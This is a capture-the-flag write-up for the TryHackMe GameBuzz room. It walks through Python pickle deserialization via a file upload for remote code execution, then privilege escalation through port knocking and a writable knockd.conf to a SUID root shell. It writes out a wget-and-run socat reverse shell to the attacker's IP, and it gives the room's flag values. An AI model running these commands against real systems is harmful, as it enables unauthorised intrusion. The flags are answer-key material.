# [GameBuzz] (https://tryhackme.com/r/room/gamebuzz)
> Author: Nayanjyoti Kumar

## Table of Content:
1. Service Enumeration
2. Initial Foothold
3. Privilege Escalation: www-data to dev2
4. Privilege Escalation: dev2 to dev1
5. Privilege Escalation: dev1 to root
6. Conclusion

## Service Enumeration:
1. As usual, scan the machine for open ports via rustscan!
> Rustscan:

> └> export RHOSTS=10.10.115.32
![Screenshot 2024-07-18 105815](https://github.com/user-attachments/assets/08562343-536d-417d-8521-96ef3d397b28)

2. According to rustscan result, we have 1 port is opened:
- Open Port: 80
- Service: Apache httpd 2.4.29 ((Ubuntu))

### HTTP on Port 80:
1. Adding a new host to /etc/hosts:
> └> echo "$RHOSTS gamebuzz.thm" >> /etc/hosts

2. Home page:
![Screenshot 2024-07-17 103608](https://github.com/user-attachments/assets/42815bde-50aa-4222-80eb-96e3a2aa9e56)

3. After poking around the website, I found this is very interesting:
![Screenshot 2024-07-17 103629](https://github.com/user-attachments/assets/ee03831b-c171-4cea-8fcb-a496225ae4cc)

![Screenshot 2024-07-17 103638](https://github.com/user-attachments/assets/3aba97e2-e6f1-4e80-b32f-df63ca492ed4)
![Screenshot 2024-07-17 103650](https://github.com/user-attachments/assets/23a47ede-2f67-4d88-a5e7-f12b546ae8a5)

4. Burp Suite HTTP history:
![Screenshot 2024-07-17 103929](https://github.com/user-attachments/assets/93274ade-a887-4581-a610-5eaa49041a5d)

5. When we clicked one of those game ratings, it’ll send a POST request to /fetch, with parameter object.

6. By putting the puzzles together, the object parameter and the .pkl file extension is for Python’s pickle, which is a serialization library.

7. In the /fetch endpoint, we send file that’s pickled (serialized) object. Then, the backend deserialize our provided pickled object.

8. Hmm… If we can upload our own evil pickled object, then we might able to gain Remote Code Execution (RCE)!

9. In the bottom of the page, we found a new domain:
![Screenshot 2024-07-17 104146](https://github.com/user-attachments/assets/fd33af6e-0d9d-43aa-9642-4a8440362982)

10. Let’s replace our host in /etc/hosts to that domain!
> └> nano /etc/hosts
> 10.10.115.32 incognito.com

11. Then, we can enumerate subdomain via ffuf:
> └> ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://incognito.com/ -H "Host: FUZZ.incognito.com" -fs 20637 -t 100

> [...]

> dev                     [Status: 200, Size: 57, Words: 5, Lines: 2, Duration: 218ms]

12. Found subdomain: dev

Then add that subdomain to /etc/hosts:
> └> nano /etc/hosts
10.10.115.32 incognito.com dev.incognito.com

13. dev:
> └> curl http://dev.incognito.com/    
> h1 style="text-align: center;">Only for Developers</h1>

Hmm… Developers only.

14. Let’s check out the robots.txt crawler file:
> └> curl http://dev.incognito.com/robots.txt
User-Agent: *
Disallow: /secret

15. Found hidden directory: /secret
![Screenshot 2024-07-17 105501](https://github.com/user-attachments/assets/32e83494-b96c-44ce-b2db-bb740a2acc17)
Hmm… HTTP staus 403 Forbidden.

16. Now, we can still enumerate hidden directory:
> └> gobuster dir -u http://dev.incognito.com/secret/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40
[...]
/upload               (Status: 301) [Size: 330] [--> http://dev.incognito.com/secret/upload/]

17. Found hidden directory in /secret/: /upload/
![Screenshot 2024-07-17 105625](https://github.com/user-attachments/assets/a00b9b5e-66a0-4663-87ab-c5f59dfd952e)

- View source page:
![Screenshot 2024-07-17 105658](https://github.com/user-attachments/assets/106a5a42-0584-4652-82fb-a2984b07cb8c)

When we clicked the “Start Upload” button, it’ll send a POST request to /secret/upload/script.php, with parameter the_file.

## Initial Foothold: 
1. Armed with above information, we can upload our own evil pickled object to the server, then deserialize the pickled object in /fetch.

2. But first, let’s upload a test file:
> └> echo -n 'testing' > test.txt
![Screenshot 2024-07-17 110009](https://github.com/user-attachments/assets/06bebab7-8962-4cd0-acaf-2013fa4670ec)

We successfully uploaded a file. But where does the file lives??
However, I couldn’t find the uploaded file.
Maybe we can upload our file to a specific path via path traversal?

3. To do so, I’ll write a Python script to upload and trigger the deserialization payload:
![Screenshot 2024-07-17 110206](https://github.com/user-attachments/assets/7bc915c4-a45e-4a54-b25a-d99f1620416d)

> └> nc -lnvp 443
listening on [any] 443 ...

![Screenshot 2024-07-17 110408](https://github.com/user-attachments/assets/cca1c5b2-9a29-449c-985d-3e9baf40bcb6)
Nope. The path traversal doesn’t work.

4. After some trial and error, I found that the uploaded file is in /var/upload/<filename>:
![Screenshot 2024-07-17 110504](https://github.com/user-attachments/assets/14325504-6a70-47f7-90ce-f8d36a614cf9)

> └> python3 upload_file.py
[*] Upload file request:
The file evilObject.pkl has been uploaded.

![Screenshot 2024-07-17 110612](https://github.com/user-attachments/assets/9f0a436c-818b-4f6c-874e-8eeb38bdd09b)

This time it worked!!
I’m user www-data!

5. user.txt:www-data@incognito:/$ cat /home/dev2/user.txt
> d14def35ed0bd914c1c5881fa0fa8090

6. Stable shell via socat:
![Screenshot 2024-07-17 110850](https://github.com/user-attachments/assets/412b9fa7-995f-4529-8026-3f7c18b3c3c9)

> www-data@incognito:/$ wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

> └> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444                

> 2023/01/24 13:20:40 socat[74118] N opening character device "/dev/pts/1" for reading and writing

> 2023/01/24 13:20:40 socat[74118] N listening on AF=2 0.0.0.0:4444

> 2023/01/24 13:21:16 socat[74118] N accepting connection from AF=2 10.10.115.32:54844 on AF=2 10.9.0.253:4444

> 2023/01/24 13:21:16 socat[74118] N starting data transfer loop with FDs [5,5] and [7,7]

> www-data@incognito:/$ 

> www-data@incognito:/$ export TERM=xterm-256color

> www-data@incognito:/$ stty rows 22 columns 107

> www-data@incognito:/$ ^C

> www-data@incognito:/$

## Privilege Escalation
### www-data to dev2
Let’s do some basic enumerations!

1. System users:

![Screenshot 2024-07-18 102026](https://github.com/user-attachments/assets/bd09eeb4-fc10-4d9f-8c2c-68c6ce9ba360)

Found 2 user: dev1, dev2

3. Found secret key in /var/www/incognito.com/:
![Screenshot 2024-07-18 102236](https://github.com/user-attachments/assets/4d7b5e69-f76e-49fa-857d-81b1d4bddd34)

4. Also, I found that we can Switch User to dev2 without password!
![Screenshot 2024-07-18 102319](https://github.com/user-attachments/assets/3c65e195-fd42-4d74-a719-954c85fb28b0)
I’m user dev2!

### dev2 to dev1
> dev2@incognito:/$ cat /var/mail/dev1 

> Hey, your password has been changed, {Redacted}.

> Knock yourself in!
Found dev1 password!
However, it looks like a password hash.

1. Let’s crack it:

![Screenshot 2024-07-18 102540](https://github.com/user-attachments/assets/60d06bc4-4245-4eb4-b460-0ca21e2f582a)

2. Cracked! Let’s Switch User to dev1:
> dev2@incognito:/$ su dev1

> Password: 

> su: Permission denied
Hmm?

3. In the netstat command output, we see port 22 is opened:
![Screenshot 2024-07-18 102812](https://github.com/user-attachments/assets/017f9df9-df14-4262-ab80-9f482d30c9ab)

4. Let’s try to SSH into it:

![Screenshot 2024-07-18 102826](https://github.com/user-attachments/assets/658f9f7c-dbf8-4107-967a-aa6fd1830c30)

Umm…
Let’s take a step back.

5. In the dev1’s mail, we see:
> Knock yourself in!
Which is referring to port knocking!

6. Now, we can check the /etc/knockd.conf config file:

![Screenshot 2024-07-18 103020](https://github.com/user-attachments/assets/e4884040-7a92-4380-b00f-ecabc53ed589)

8. As you can see, it has 2 port knocking sequences:
> Open SSH: 5020 -> 6120 -> 7340

> Close SSH: 9000 -> 8000 -> 7000

8. Armed with above information, we can open the SSH service by knocking port 5020, 6120, 7340:
![Screenshot 2024-07-18 103116](https://github.com/user-attachments/assets/2219dde9-cf13-4fab-b924-36102f602fd5)

9. We now should able to SSH to dev1:

![Screenshot 2024-07-18 103122](https://github.com/user-attachments/assets/180ac4a7-e642-4429-ac25-3b103b4c1e87)

Wait. Wrong password?

11. Maybe the password is the MD5 hash one?
![image](https://github.com/user-attachments/assets/8f0cf2f7-4d16-4776-838a-581a5a6b0ea9)
Oh! It’s the MD5 hash one!

And I’m user dev1!

### dev1 to root
1. Sudo permission:
![Screenshot 2024-07-18 103947](https://github.com/user-attachments/assets/e6a22064-acbe-4a3f-9608-52fe5932a367)

2. In user dev1, we can run /etc/init.d/knockdstartups script as root!
> dev1@incognito:~$ sudo /etc/init.d/knockd

> * Usage: /etc/init.d/knockd {start|stop|restart|reload|force-reload}

3. However, we don’t have write access to it, so we couldn’t swap the knockd SH script to our evil script:
> dev1@incognito:~$ cd /etc/init.d/

> dev1@incognito:/etc/init.d$ ls -lah knockd

> -rwxr-xr-x 1 root root 1.8K Oct  8  2016 knockd

4. Hmm… How about /etc/knockd.conf?
> dev1@incognito:/etc/init.d$ ls -lah /etc/knockd.conf

> -rw-rw-r--+ 1 root root 349 Jun 11  2021 /etc/knockd.conf
We have write access to it!

5. Armed with above information, we can modify the command key’s value to add a SUID sticky bit to /bin/bash:
![Screenshot 2024-07-18 104349](https://github.com/user-attachments/assets/1dffc285-634e-4a09-a0bb-9e70e31621bf)

6. Then, restart knockd and knock port 5020, 6120, 7340 again:
> dev1@incognito:/etc/init.d$ sudo /etc/init.d/knockd restart

> [ ok ] Restarting knockd (via systemctl): knockd.service.

> └> knock -v $RHOSTS 5020 6120 7340

> hitting tcp 10.10.115.32:5020

> hitting tcp 10.10.115.32:6120

> hitting tcp 10.10.115.32:7340


> dev1@incognito:/etc/init.d$ ls -lah /tmp/root_bash 

> -rwsr-sr-x 1 root root 1.1M Jan 24 06:25 /tmp/root_bash
We did it!

7. Let’s spawn a root Bash shell!
![image](https://github.com/user-attachments/assets/d404912f-6171-404f-8e13-242d03b10940)
I’m root! :D

## Rooted
root.txt:

> root_bash-4.4# cat /root/root.txt

> 9dcb607e31348671de36b9eb7446cb59
